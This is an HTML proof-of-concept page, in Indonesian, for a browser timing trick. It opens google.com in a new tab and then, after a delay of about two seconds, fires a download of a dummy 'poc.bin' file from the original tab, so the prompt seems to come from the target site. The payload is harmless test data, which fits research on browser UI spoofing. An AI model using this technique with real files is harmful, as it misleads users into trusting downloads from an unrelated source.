<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>Best-Effort UI Timing PoC</title>
<style>
  body{font-family:system-ui,Arial;padding:40px}
  button{padding:14px 22px;font-size:16px}
  #log{margin-top:12px;color:#555;white-space:pre-wrap}
</style>
</head>
<body>

<h3>Open Target → Delayed Browser UI</h3>
<p>
Klik sekali. Tab baru dibuka ke target. Setelah delay (agar target terlihat penuh),
aksi browser-level (download) dipicu dari tab asal.
</p>

<button id="go">Run</button>
<div id="log"></div>

<script>
const log = s => document.getElementById('log').textContent += s + "\n";

document.getElementById('go').onclick = () => {
  log("User click");

  // 1) Buka tab target (user gesture)
  window.open("https://www.google.com", "_blank");
  log("Opened target tab");

  // 2) Delay agar target kemungkinan sudah load penuh
  //    Android Chrome sering butuh 1500–3000ms
  setTimeout(() => {
    log("Triggering browser UI (download)");

    // 3) Aksi browser-level: download
    const a = document.createElement('a');
    a.href = "data:application/octet-stream,TEST";
    a.download = "poc.bin";
    document.body.appendChild(a);
    a.click();
    a.remove();

  }, 2200); // tweak 1500–3000ms
};
</script>

</body>
</html>